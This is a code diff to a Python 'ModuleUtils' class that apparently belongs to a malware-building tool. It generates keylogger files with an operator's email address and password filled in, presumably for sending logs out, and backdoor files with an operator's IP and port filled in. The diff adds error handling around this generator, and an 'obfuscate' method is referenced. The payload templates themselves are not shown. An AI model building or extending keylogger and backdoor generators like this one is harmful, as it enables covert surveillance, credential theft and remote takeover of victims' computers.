@@ -97,34 +97,40 @@ class ModuleUtils(Utils):
         Raises:
             IndexError: If an invalid module number is provided.
         """
-        self.clear()
-        if OS == "windows":
-            payload_path: str = f"packages\\payloads\\{kwargs["module"]}\\{kwargs["payload"]}"
-        else:
-            payload_path: str = f"./packages/payloads/{kwargs["module"]}/{kwargs["payload"]}"
+        try:
+            self.clear()
+            if OS == "windows":
+                payload_path: str = f"packages\\payloads\\{kwargs["module"]}\\{kwargs["payload"]}"
+            else:
+                payload_path: str = f"./packages/payloads/{kwargs["module"]}/{kwargs["payload"]}"
 
-        payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))
+            payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))
         
-        match str(kwargs["module"]).lower():
-            case "keylogger":
-                with open(kwargs["name"], "w", encoding="utf-8") as file:
-                    with open(payload_location, 'r', encoding='utf-8') as file1:
-                        file_content = file1.read()
-                        file_content = file_content.replace("userMail_", kwargs["mail"])
-                        file_content = file_content.replace("userPassword_", kwargs["password"])
-                        file_content = file_content.replace("timeOut_", str(kwargs["timeout"]))
-                        file.write(file_content)
-                        
-            case "backdoor":
-                with open(kwargs["name"], "w", encoding="utf-8") as file:
-                    with open(payload_location, 'r', encoding='utf-8') as file1:
-                        file_content = file1.read()
-                        file_content = file_content.replace("userIP_", kwargs["ip"])
-                        file_content = file_content.replace("userPort_", str(kwargs["port"]))
-                        file.write(file_content)
-                        
-            case _:
-                raise ValueError(self.write(message="Invalid Module", level=4))
+            match str(kwargs["module"]).lower():
+                case "keylogger":
+                    with open(kwargs["name"], "w", encoding="utf-8") as file:
+                        with open(payload_location, 'r', encoding='utf-8') as file1:
+                            file_content = file1.read()
+                            file_content = file_content.replace("userMail_", kwargs["mail"])
+                            file_content = file_content.replace("userPassword_", kwargs["password"])
+                            file_content = file_content.replace("timeOut_", str(kwargs["timeout"]))
+                            file.write(file_content)
+                            
+                case "backdoor":
+                    with open(kwargs["name"], "w", encoding="utf-8") as file:
+                        with open(payload_location, 'r', encoding='utf-8') as file1:
+                            file_content = file1.read()
+                            file_content = file_content.replace("userIP_", kwargs["ip"])
+                            file_content = file_content.replace("userPort_", str(kwargs["port"]))
+                            file.write(file_content)
+                            
+                case _:
+                    raise ValueError(self.write(message="Invalid Module", level=4))
+        
+        except FileNotFoundError:
+            os.remove(kwargs["name"])
+            self.write(message=f"Payload named {kwargs["payload"]} not found", level=4, clear=True)
+            sys.exit(1)
 
     def obfuscate(self, name : str) -> None:
         """
